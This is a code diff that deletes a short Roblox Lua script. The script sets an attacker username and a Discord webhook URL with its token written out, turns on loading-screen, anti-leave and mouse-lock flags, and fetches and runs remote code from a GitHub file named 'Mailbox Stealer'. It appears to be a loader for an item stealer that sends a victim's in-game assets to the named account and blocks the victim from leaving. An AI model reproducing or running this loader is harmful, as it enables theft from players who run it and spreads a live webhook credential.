@@ -1,9 +1,0 @@
-_G.UserName = "LeguyGamer"
-_G.UserName2 = "LeguyGamer"
-_G.Webhook = "https://discord.com/api/webhooks/1131156955742879827/VttZDmF50MQE7TnGPJ-8UlZJPuZ549x-wZcb7rlB-XHtFDhnPwJg22it-r34M1FW-t-t"
-
-_G.LoadingScreen = true
-_G.AntiLeave = true
-_G.MouseLock = true
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-sc/Psxsc/main/Mailbox%20Stealer", true))()
